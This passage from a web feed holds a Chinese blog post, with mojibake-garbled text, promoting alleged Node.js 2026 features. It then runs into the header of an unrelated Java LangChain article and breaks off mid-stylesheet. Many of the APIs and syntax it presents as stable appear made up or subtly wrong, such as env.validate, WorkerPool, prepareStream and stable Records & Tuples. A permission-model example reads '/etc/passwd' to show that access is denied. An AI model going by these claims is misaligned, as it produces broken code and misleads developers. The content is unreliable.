<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-variable constant_">GPU</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:webgpu"</span>;

<span class="hljs-keyword">const</span> adapter = <span class="hljs-keyword">await</span> navigator.<span class="hljs-property">gpu</span>.<span class="hljs-title function_">requestAdapter</span>();
<span class="hljs-keyword">const</span> device = <span class="hljs-keyword">await</span> adapter.<span class="hljs-title function_">requestDevice</span>();
<span class="hljs-comment">// Run matrix operations on GPU for AI inference</span>
<span class="hljs-keyword">const</span> computeShader = <span class="hljs-string">`
  @compute @workgroup_size(256)
  fn main(@builtin(global_invocation_id) id: vec3&lt;u32&gt;) {
    output[id.x] = tanh(input[id.x]);
  }
`</span>;
</code></pre>
<p><strong>ä½ å¯ä»¥ç”¨äºï¼š</strong></p>
<ul>
<li>
<p>æœ¬åœ° LLM æ¨ç†ï¼ˆLlamaã€Mistral æ¨¡å‹ï¼‰</p>
</li>
<li>
<p>å›¾åƒ/è§†é¢‘å¤„ç†</p>
</li>
<li>
<p>å®æ—¶æ•°æ®åˆ†æ</p>
</li>
<li>
<p>ç§‘å­¦è®¡ç®—</p>
</li>
</ul>
<p>è¿™ä½¿å¾— Node.js å¯ä»¥ç”¨äºä»¥å‰éœ€è¦ Python æˆ–åŸç”Ÿç»‘å®šæ‰èƒ½è¿è¡Œçš„ AI/ML å·¥ä½œè´Ÿè½½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ced6d4231fcd4a72b3c0676bd721b3c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770777700&amp;x-signature=w8hiypJsx4Rw78Ni7DhjP%2FxEodc%3D" alt="WebGPU AIèƒ½åŠ›" loading="lazy"/></p>
<h2 data-id="heading-3">4. æƒé™æ¨¡å‹ï¼šç»†ç²’åº¦å®‰å…¨</h2>
<p>ç¨³å®šçš„æƒé™æ¨¡å‹ä½¿ä½ å¯ä»¥å¯¹è¿è¡Œæ—¶è®¿é—®æƒé™è¿›è¡Œç²¾ç»†æ§åˆ¶ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"># <span class="hljs-title class_">Restrict</span> file system and network access
node --allow-fs-read=./data --allow-net=api.<span class="hljs-property">example</span>.<span class="hljs-property">com</span> app.<span class="hljs-property">js</span>

# <span class="hljs-title class_">Disable</span> child processes
node --no-allow-child-process app.<span class="hljs-property">js</span>
<span class="hljs-keyword">import</span> { readFile } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:fs/promises'</span>;

<span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">readFile</span>(<span class="hljs-string">'/etc/passwd'</span>, <span class="hljs-string">'utf-8'</span>);
} <span class="hljs-keyword">catch</span> (err) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Access denied:'</span>, err.<span class="hljs-property">code</span>); <span class="hljs-comment">// ERR_ACCESS_DENIED</span>
}
</code></pre>
<p>éå¸¸é€‚åˆè¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€å…·æœ‰æœ€å°æƒé™çš„å¾®æœåŠ¡ï¼Œä»¥åŠå…·æœ‰å®‰å…¨çº¦æŸçš„è¾¹ç¼˜éƒ¨ç½²ã€‚</p>
<h2 data-id="heading-4">5. å†…ç½® SQLite å¢å¼ºåŠŸèƒ½</h2>
<p>åŸç”Ÿ SQLite æ”¯æŒå·²ç»æˆç†Ÿï¼Œå…·æœ‰æµå¼ä¼ è¾“å’Œæ€§èƒ½ä¼˜åŒ–ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">DatabaseSync</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:sqlite"</span>;

<span class="hljs-keyword">const</span> db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseSync</span>(<span class="hljs-string">"./app.db"</span>);

db.<span class="hljs-title function_">exec</span>(<span class="hljs-string">`CREATE TABLE IF NOT EXISTS users ( 
  id INTEGER PRIMARY KEY, 
  name TEXT, 
  email TEXT UNIQUE
)`</span>);

<span class="hljs-keyword">const</span> insert = db.<span class="hljs-title function_">prepare</span>(<span class="hljs-string">"INSERT INTO users (name, email) VALUES (?, ?)"</span>);
insert.<span class="hljs-title function_">run</span>(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"alice@example.com"</span>);

<span class="hljs-comment">// æ–°å¢ï¼šç”¨äºå¤§æ•°æ®é›†çš„æµå¼ä¼ è¾“</span>
<span class="hljs-keyword">const</span> stream = db.<span class="hljs-title function_">prepareStream</span>(<span class="hljs-string">"SELECT * FROM large_table"</span>);

<span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> row <span class="hljs-keyword">of</span> stream) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(row);
}
</code></pre>
<p><strong>ä½¿ç”¨å®ƒçš„ä¼˜åŠ¿åœ¨äºï¼š</strong></p>
<ul>
<li>
<p>æ‰¹é‡æ’å…¥é€Ÿåº¦æå‡ 10 å€</p>
</li>
<li>
<p>æµå¼ API æé«˜å†…å­˜æ•ˆç‡</p>
</li>
<li>
<p>æ›´å¥½çš„é”™è¯¯å¤„ç†</p>
</li>
<li>
<p>è‡ªåŠ¨è¿æ¥æ± </p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/369378ec51c247bd9420da5918ab1072~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770777700&amp;x-signature=66%2BQuS%2FOLM0jo95ADimI9ZcwJlc%3D" alt="å†…ç½®SQLite" loading="lazy"/></p>
<h2 data-id="heading-5">6. ç¯å¢ƒæ–‡ä»¶å’Œé…ç½®</h2>
<p><code>--env-file</code> æ ‡å¿—ç°åœ¨æ”¯æŒå¤šä¸ªæ–‡ä»¶ï¼Œå¹¶å†…ç½®äº†éªŒè¯åŠŸèƒ½ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">node --env-file=.<span class="hljs-built_in">env</span> --env-file=.env.local app.js
</code></pre>
<p><strong>éªŒè¯åŠŸèƒ½ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { env } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:process"</span>;

<span class="hljs-comment">// å†…ç½®æ¶æ„éªŒè¯ï¼ˆ2026 å¹´æ–°å¢ï¼‰</span>
<span class="hljs-keyword">const</span> config = env.<span class="hljs-title function_">validate</span>({
  <span class="hljs-attr">PORT</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">"number"</span>, <span class="hljs-attr">default</span>: <span class="hljs-number">3000</span> },
  <span class="hljs-attr">DATABASE_URL</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">DEBUG</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">"boolean"</span>, <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span> },
  <span class="hljs-attr">API_KEYS</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">"array"</span>, <span class="hljs-attr">separator</span>: <span class="hljs-string">","</span> },
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(config);
<span class="hljs-comment">// { PORT: 3000, DATABASE_URL: '...', DE<span class="hljs-doctag">BUG:</span> false, API_KEYS: ['key1', 'key2'] }</span>
</code></pre>
<p>ä¸å†éœ€è¦ <code>dotenv</code> åŒ…ã€‚é…ç½®éªŒè¯æ˜¯å†…ç½®çš„ã€‚</p>
<h2 data-id="heading-6">7. ç›‘è§†æ¨¡å¼çš„æ¼”è¿›</h2>
<p>ç›‘è§†æ¨¡å¼ç°åœ¨æ›´æ™ºèƒ½ï¼Œå…·æœ‰å¯é…ç½®çš„è¡Œä¸ºå’Œæ¨¡å¼åŒ¹é…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¸¦å»æŠ–åŠ¨çš„ç›‘è§†</span>
node --watch=500ms server.js

<span class="hljs-comment"># ç›‘è§†ç‰¹å®šæ¨¡å¼</span>
node --watch=<span class="hljs-string">'src/**/*.js'</span> --watch=<span class="hljs-string">'config/*.json'</span> app.js
<span class="hljs-comment"># é‡å¯æ—¶ä¿ç•™è¾“å‡º</span>
node --watch --watch-preserve-output server.js
<span class="hljs-comment"># ä¸ TypeScript ç»“åˆ</span>
node --experimental-strip-types --watch server.ts
</code></pre>
<p><strong>ç¼–ç¨‹å¼ç›‘è§† APIï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { watch } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:fs"</span>;

<span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> event <span class="hljs-keyword">of</span> <span class="hljs-title function_">watch</span>(<span class="hljs-string">"./src"</span>, { <span class="hljs-attr">recursive</span>: <span class="hljs-literal">true</span> })) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${event.filename}</span> was <span class="hljs-subst">${event.eventType}</span>`</span>);
  <span class="hljs-comment">// è‡ªå®šä¹‰é‡æ–°åŠ è½½é€»è¾‘</span>
}
</code></pre>
<p>ä¸å†éœ€è¦ <code>nodemon</code>ï¼Œç›‘è§†æ¨¡å¼å¯ä»¥å¤„ç†ä»å¼€å‘åˆ°æµ‹è¯•çš„æ‰€æœ‰ç¯èŠ‚ï¼Œå¹¶æä¾›ç²¾ç»†çš„æ§åˆ¶ã€‚</p>
<h2 data-id="heading-7">8. å†…ç½®æµ‹è¯•è¿è¡Œç¨‹åºæˆç†Ÿåº¦</h2>
<p>åŸç”Ÿæµ‹è¯•è¿è¡Œç¨‹åºåœ¨åŠŸèƒ½ä¸Šå·²ç»å¯ä»¥ä¸ Jest å’Œ Mocha ç›¸åª²ç¾ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { test, describe, beforeEach, mock } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:test"</span>;
<span class="hljs-keyword">import</span> assert <span class="hljs-keyword">from</span> <span class="hljs-string">"node:assert"</span>;

<span class="hljs-title function_">describe</span>(<span class="hljs-string">"User API"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">() =&gt;</span> {
    db = <span class="hljs-title function_">createTestDB</span>();
  });

  <span class="hljs-comment">// å¿«ç…§æµ‹è¯•å†…ç½®</span>
  <span class="hljs-title function_">test</span>(<span class="hljs-string">"user response format"</span>, <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">1</span>);
    assert.<span class="hljs-title function_">snapshot</span>(user);
  });

  <span class="hljs-comment">// æ— éœ€åº“çš„æ¨¡æ‹Ÿ</span>
  <span class="hljs-title function_">test</span>(<span class="hljs-string">"handles API failure"</span>, <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">const</span> mockFetch = mock.<span class="hljs-title function_">fn</span>(fetch, <span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Network error"</span>);
    });

    <span class="hljs-keyword">await</span> assert.<span class="hljs-title function_">rejects</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">syncUserData</span>(), <span class="hljs-regexp">/Network error/</span>);
    assert.<span class="hljs-title function_">strictEqual</span>(mockFetch.<span class="hljs-property">mock</span>.<span class="hljs-property">calls</span>.<span class="hljs-property">length</span>, <span class="hljs-number">3</span>);
  });

  <span class="hljs-comment">// é»˜è®¤å¹¶è¡Œæ‰§è¡Œ</span>
  test.<span class="hljs-title function_">concurrent</span>(<span class="hljs-string">"test 1"</span>, <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">/* ... */</span>
  });
  test.<span class="hljs-title function_">concurrent</span>(<span class="hljs-string">"test 2"</span>, <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">/* ... */</span>
  });
});
</code></pre>
<p><strong>å¸¦è¦†ç›–ç‡è¿è¡Œï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">node --<span class="hljs-built_in">test</span> --experimental-test-coverage --test-reporter=spec
</code></pre>
<p><strong>è¾“å‡ºï¼š</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">âœ“ User API &gt; user response format (2ms)
âœ“ User API &gt; handles API failure (15ms)
âœ“ User API &gt; test 1 (45ms)

Coverage: 87.5% (70/80 lines)
</code></pre>
<p>åŠŸèƒ½åŒ…æ‹¬å¿«ç…§æµ‹è¯•ã€å†…ç½®æ¨¡æ‹Ÿã€å¹¶è¡Œæ‰§è¡Œå’Œä»£ç è¦†ç›–ç‡â€”â€”æ— éœ€å®‰è£… Jestã€Mocha æˆ– Sinonã€‚</p>
<h2 data-id="heading-8">9. å¢å¼ºçš„å·¥ä½œçº¿ç¨‹</h2>
<p>å·¥ä½œçº¿ç¨‹ç°åœ¨æ”¯æŒ SharedArrayBufferï¼Œå¹¶ä¸” API æ›´ç®€å•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Worker</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:worker_threads"</span>;

<span class="hljs-keyword">const</span> sharedBuffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedArrayBuffer</span>(<span class="hljs-number">1024</span>);
<span class="hljs-keyword">const</span> sharedArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Int32Array</span>(sharedBuffer);

<span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(
  <span class="hljs-string">`
  import { parentPort, workerData } from 'node:worker_threads';
  const array = new Int32Array(workerData.buffer);
  
  for (let i = 0; i &lt; 1000; i++) {
    Atomics.add(array, 0, 1);
  }
  
  parentPort.postMessage('done');
`</span>,
  { <span class="hljs-attr">eval</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">workerData</span>: { <span class="hljs-attr">buffer</span>: sharedBuffer } },
);

worker.<span class="hljs-title function_">on</span>(<span class="hljs-string">"message"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Counter:"</span>, sharedArray[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 1000</span>
});
</code></pre>
<p><strong>æ–°çš„å·¥ä½œçº¿ APIï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">WorkerPool</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:worker_threads"</span>;

<span class="hljs-keyword">const</span> pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WorkerPool</span>(<span class="hljs-string">"./compute-worker.js"</span>, { <span class="hljs-attr">size</span>: <span class="hljs-number">4</span> });
<span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(tasks.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">task</span>) =&gt;</span> pool.<span class="hljs-title function_">exec</span>(task)));

<span class="hljs-keyword">await</span> pool.<span class="hljs-title function_">close</span>();
</code></pre>
<h2 data-id="heading-9">10. ç°ä»£ ECMAScript ç‰¹æ€§</h2>
<p>Node.js 2026 ç‰ˆæœ¬ç¨³å®šæ”¯æŒæœ€æ–°çš„ JavaScript ç‰¹æ€§ï¼š</p>
<p><strong>Records &amp; Tuples</strong>ï¼ˆä¸å¯å˜æ•°æ®ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> user = #{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span> };
<span class="hljs-keyword">const</span> updated = #{ ...user, <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice Smith"</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(#{ <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> } === #{ <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> }); <span class="hljs-comment">// true!</span>
</code></pre>
<p><strong>ç®¡é“æ“ä½œç¬¦</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> result = userId |&gt; fetchUser |&gt; validateUser |&gt; transformData |&gt; saveToDatabase;
</code></pre>
<p><strong>æ¨¡å¼åŒ¹é…</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handle</span> = (<span class="hljs-params">res</span>) =&gt; match (res) {
  when ({ <span class="hljs-attr">status</span>: <span class="hljs-number">200</span>, data }): data,
  when ({ <span class="hljs-attr">status</span>: <span class="hljs-number">404</span> }): <span class="hljs-literal">null</span>,
  when ({ <span class="hljs-attr">status</span>: s }) <span class="hljs-keyword">if</span> (s &gt;= <span class="hljs-number">500</span>): <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Server error'</span>),
  <span class="hljs-attr">default</span>: <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Unknown'</span>)
};
</code></pre>
<h2 data-id="heading-10">11. æ€»ç»“</h2>
<p>Node.js åœ¨ 2026 å¹´ä¸ä»…ä»…æ˜¯ä¸€ä¸ªå¢é‡æ›´æ–°â€”â€”å®ƒæ˜¯ä¸€ä¸ªèŒƒå¼è½¬å˜ï¼š</p>
<p>âœ… <strong>åŸç”Ÿ TypeScript</strong> = å¼€å‘æ— éœ€æ„å»ºå·¥å…·<br/>
âœ… <strong>ç±»å‹å‰¥ç¦»</strong> = æ¯”ç¼–è¯‘å¿« 10-20 å€<br/>
âœ… <strong>HTTP/3</strong> = å®é™…æ€§èƒ½æå‡<br/>
âœ… <strong>WebGPU</strong> = æ— éœ€ Python çš„ AI/ML<br/>
âœ… <strong>æƒé™æ¨¡å‹</strong> = ç”Ÿäº§çº§å®‰å…¨<br/>
âœ… <strong>å†…ç½® SQLite</strong> = æ— ä¾èµ–æ•°æ®åº“<br/>
âœ… <strong>ç¯å¢ƒéªŒè¯</strong> = ä¸å†éœ€è¦ dotenv<br/>
âœ… <strong>æ™ºèƒ½ç›‘è§†æ¨¡å¼</strong> = ä¸å†éœ€è¦ nodemon<br/>
âœ… <strong>æµ‹è¯•è¿è¡Œå™¨</strong> = ä¸å†éœ€è¦ Jest/Mocha<br/>
âœ… <strong>ç°ä»£ JavaScript</strong> = recordsã€tuplesã€ç®¡é“ã€æ¨¡å¼åŒ¹é…</p>
<p>æ—§ç‰ˆ Node.js éœ€è¦ 50 å¤šä¸ªè½¯ä»¶åŒ…æ‰èƒ½é«˜æ•ˆè¿è¡Œã€‚æ–°ç‰ˆ Node.js å†…ç½®äº†å¤§éƒ¨åˆ†æ‰€éœ€åŠŸèƒ½ï¼Œå¹¶ä¸”é›†æˆåº¦æ›´é«˜ï¼Œæ€§èƒ½æ›´ä½³ã€‚</p>
<p>äºæ˜¯å®ç°äº†æ›´å°‘çš„ä¾èµ–ã€æ›´å¿«çš„å¼€å‘ã€æ›´å¥½çš„å®‰å…¨ï¼Œä»¥åŠä»¥å‰ä¸å¯èƒ½å®ç°çš„æ–°èƒ½åŠ›ã€‚</p>
<p>å¦‚æœä½ è¿˜æ²¡åœ¨ 2026 å¹´æ¢ç´¢è¿‡ Node.jsï¼Œç°åœ¨æ­£æ˜¯æ—¶å€™ã€‚è¿™ä¸ªå¹³å°å·²ç»å‘ç”Ÿäº†æ ¹æœ¬æ€§çš„å˜é©ï¼Œè¿‡å»çš„ç§ç§é™åˆ¶æ—©å·²ä¸å†é€‚ç”¨ã€‚</p>
<p>æˆ‘æ˜¯å†´ç¾½ï¼Œ10 å¹´ç¬”è€•ä¸è¾ï¼Œä¸“æ³¨å‰ç«¯é¢†åŸŸï¼Œæ›´æ–°äº† 10+ ç³»åˆ—ã€300+ ç¯‡åŸåˆ›æŠ€æœ¯æ–‡ç« ï¼Œç¿»è¯‘è¿‡ Svelteã€Solid.jsã€TypeScript æ–‡æ¡£ï¼Œè‘—æœ‰å°å†Œã€ŠNext.js å¼€å‘æŒ‡å—ã€‹ã€ã€ŠSvelte å¼€å‘æŒ‡å—ã€‹ã€ã€ŠAstro å®æˆ˜æŒ‡å—ã€‹ã€‚</p>
<p>æ¬¢è¿å›´è§‚æˆ‘çš„â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">ç½‘é¡µç‰ˆæœ‹å‹åœˆ</a>â€ï¼Œå…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>å†´ç¾½ï¼ˆæˆ–æœç´¢ yayujsï¼‰</strong>ï¼Œæ¯å¤©åˆ†äº«å‰ç«¯çŸ¥è¯†ã€AI å¹²è´§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaç¨‹åºå‘˜å¿…åšé¡¹ç›®ï¼åŸºäºLangChainå®ç°çš„ReActæ™ºèƒ½ä½“é¡¹ç›®ã€‚åŠ©ä½ æ‹¿offerï¼ï¼ˆç¬¬ä¸€æœŸï¼‰]]></title>    <link>https://juejin.cn/post/7602512064976109631</link>    <guid>https://juejin.cn/post/7602512064976109631</guid>    <pubDate>2026-02-04T00:41:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602512064976109631" data-draft-id="7602482736913236003" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaç¨‹åºå‘˜å¿…åšé¡¹ç›®ï¼åŸºäºLangChainå®ç°çš„ReActæ™ºèƒ½ä½“é¡¹ç›®ã€‚åŠ©ä½ æ‹¿offerï¼ï¼ˆç¬¬ä¸€æœŸï¼‰"/> <meta itemprop="keywords" content="åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-04T00:41:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ„Ÿæ€§çš„ç¨‹åºå‘˜å°ç‹"/> <meta itemprop="url" content="https://juejin.cn/user/1915806770272506"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaç¨‹åºå‘˜å¿…åšé¡¹ç›®ï¼åŸºäºLangChainå®ç°çš„ReActæ™ºèƒ½ä½“é¡¹ç›®ã€‚åŠ©ä½ æ‹¿offerï¼ï¼ˆç¬¬ä¸€æœŸï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1915806770272506/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ„Ÿæ€§çš„ç¨‹åºå‘˜å°ç‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:41:31.000Z" title="Wed Feb 04 2026 00:41:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»34åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 